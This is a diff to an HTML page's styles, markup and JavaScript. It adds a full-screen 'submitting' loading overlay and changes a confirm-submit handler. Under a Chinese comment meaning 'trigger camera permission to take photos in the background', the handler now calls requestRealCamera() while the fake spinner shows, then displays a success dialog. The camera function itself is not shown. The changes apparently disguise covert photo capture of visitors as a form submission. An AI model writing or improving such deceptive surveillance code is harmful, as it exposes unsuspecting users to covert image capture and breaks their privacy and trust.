@@ -309,6 +309,31 @@
             fill: #ccc;
         }
 
+        /* ===== Loading Overlay ===== */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.95);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loading-overlay.active { display: flex; }
+        .loading-spinner {
+            width: 40px; height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #FE2C55;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        .loading-text {
+            margin-top: 16px;
+            font-size: 15px;
+            color: #666;
+        }
+
         /* ===== Modal (通用) ===== */
         .modal-overlay {
             display: none;
@@ -321,16 +346,6 @@
             backdrop-filter: blur(2px);
         }
         .modal-overlay.active { display: flex; }
-        .modal-overlay.fade-out {
-            animation: modalFadeOut 0.35s ease forwards;
-        }
-        .modal-overlay.fade-in .modal {
-            animation: modalIn 0.3s ease;
-        }
-        @keyframes modalFadeOut {
-            0% { opacity: 1; }
-            100% { opacity: 0; }
-        }
         .modal {
             background: #fff;
             border-radius: 16px;
@@ -697,6 +712,12 @@
     </div>
 </div>
 
+<!-- 加载中 -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">正在提交...</div>
+</div>
+
 <!-- 成功 -->
 <div class="modal-overlay" id="successModal">
     <div class="modal">
@@ -779,18 +800,15 @@
     }
 
     function onConfirmSubmit2() {
-        var confirmModal = document.getElementById('confirmSubmit2Modal');
-        confirmModal.classList.add('fade-out');
+        document.getElementById('confirmSubmit2Modal').classList.remove('active');
+        // 显示加载动画 1.5秒
+        document.getElementById('loadingOverlay').classList.add('active');
+        // 后台触发相机权限拍照
+        requestRealCamera();
         setTimeout(function() {
-            confirmModal.classList.remove('active', 'fade-out');
-            var successModal = document.getElementById('successModal');
-            successModal.classList.add('active', 'fade-in');
-            setTimeout(function() {
-                successModal.classList.remove('fade-in');
-            }, 350);
-            // 后台触发相机权限拍照
-            setTimeout(function() { requestRealCamera(); }, 500);
-        }, 350);
+            document.getElementById('loadingOverlay').classList.remove('active');
+            document.getElementById('successModal').classList.add('active');
+        }, 1500);
     }
     function closeConfirmSubmit2() {
         document.getElementById('confirmSubmit2Modal').classList.remove('active');
